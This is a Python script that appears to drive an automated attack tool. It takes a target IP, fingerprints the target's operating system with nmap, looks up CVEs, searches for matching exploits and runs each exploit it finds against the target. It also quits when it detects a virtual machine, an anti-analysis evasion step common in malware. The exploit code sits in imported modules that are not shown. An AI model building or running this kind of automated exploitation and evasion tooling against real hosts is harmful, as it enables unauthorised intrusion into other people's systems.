from apply_exploit import *
from get_cve import *
from vm_detection import *
from executing import *


if __name__ == "__main__":
    target_ip = input("Enter target IP: ")

    if is_vm():
        print("The system is running in a virtual machine.")
        exit(1)
    
    nmap_output = subprocess.run(["nmap", "-O", target_ip], capture_output=True, text=True)
    os_info = "Unknown"
    for line in nmap_output.stdout.split("\n"):
        if "OS details:" in line:
            os_info = line.split(":", 1)[1].strip()
            break
    print(f"Detected OS: {os_info}")
    
    cve_list = get_cve()
    if cve_list:
        for cve_info in cve_list:
            cve = cve_info["cve"]
            print(f"Searching for exploits for {cve}...")
            results = search_exploits(cve)
            
            if results: 
                print(f"Found exploits for {cve}:")
                for platform, result in results.items():
                    print(f"{platform}: {result}")
                execute_exploit(cve, target_ip)
            else:
                print(f"No exploits found for {cve}.")
    else:
        print("No CVEs found.")